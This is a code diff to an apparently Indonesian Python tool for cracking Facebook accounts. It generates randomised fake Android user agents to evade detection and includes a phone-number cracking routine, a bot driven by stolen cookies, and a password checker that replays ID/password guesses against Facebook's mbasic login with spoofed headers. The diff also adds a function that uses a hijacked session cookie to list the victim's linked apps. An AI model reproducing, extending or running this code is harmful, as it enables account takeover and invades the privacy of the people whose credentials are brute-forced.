@@ -68,12 +68,13 @@ for xd in range(10000):
 
 for t in range(10000):
 	rr = random.randint
-	samsung=random.choice(['SM-J415N','SM-J610G','CPH2109','SM-M236B','SM-J610F','SM-J410G','SM-A536E'])
+	samsung=random.choice(['SM-J415N','SM-J610G','SM-J610F','SM-A536E','SM-G531H'])
 	build=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
 	browser=random.choice(['HeyTapBrowser/10.8.12.2','HeyTapBrowser/45.9.3.1.1','HeyTapBrowser/40.8.12.2','HeyTapBrowser/10.7.10.0.2','HeyTapBrowser/10.8.9.1','HeyTapBrowser/26.7.36.1','HeyTapBrowser/12.7.36.1','HeyTapBrowser/8.7.36.1','HeyTapBrowser/30.7.36.1','HeyTapBrowser/18.7.36.1','HeyTapBrowser/23.7.36.1'])
-	brayen1=f'Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; {samsung} Build/{build}.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 '
-	brayen2=f'Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; {samsung} Build/{build}.{str(rr(111111,210000))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 {browser}'
-	uaku2 = random.choice([brayen1,brayen2])
+	brayen1=f'Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {samsung} Build/{build}.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 '
+	brayen2=f'Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {samsung} Build/{build}.{str(rr(111111,210000))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 {browser}'
+	brayen3=f'Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {samsung}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
+	uaku2 = random.choice([brayen1,brayen2,brayen3])
 	ugen.append(uaku2)
 	
 for x in range(10):
@@ -357,7 +358,8 @@ def memek():
 				print("\n")
 				cetak(nel(f'Bot Auto Share Telah Berhenti Mungkin Di Karna Cookie Telah Mokad',width=90,padding=0,style='bold white'));exit()
 	except requests.exceptions.ConnectionError:
-		print(f"\n [+] Anda Tidak Terhubung Ke Internet");exit() 
+		print(f"\n [+] Anda Tidak Terhubung Ke Internet");exit() 	
+
 #------------------[ CRACK NOMOR ]-------------------# 
 def crack_nomor():
 	cetak(nel('  Crack Menggunakan Nomor Wajib Menggunakan Sandi Manual Saat Crack ',width=90,padding=(0,8),style=f"bold white"))
@@ -1685,9 +1687,30 @@ def colmek2(idf,pwv):
 	loop+=1
 
 #-----------------------[ CEK APLIKASI ]--------------------#
+def cek_apk(kuki):
+	session = requests.Session()
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+	except AttributeError:
+		print ("\r    %s\033[0m cookie invalid"%(M))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+	except AttributeError:
+		print ("\r    %s \033[0mcookie invalid"%(M))
+
 def ceker(idf,pw):
 	global cp
-	ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 EdgiOS/112.1722.44 Mobile/15E148 Safari/605.1.15'
+	ua = 'Mozilla/5.0 (Linux; Android 12; CPH2089 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]'
 	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 	ses = requests.Session()
 	try:
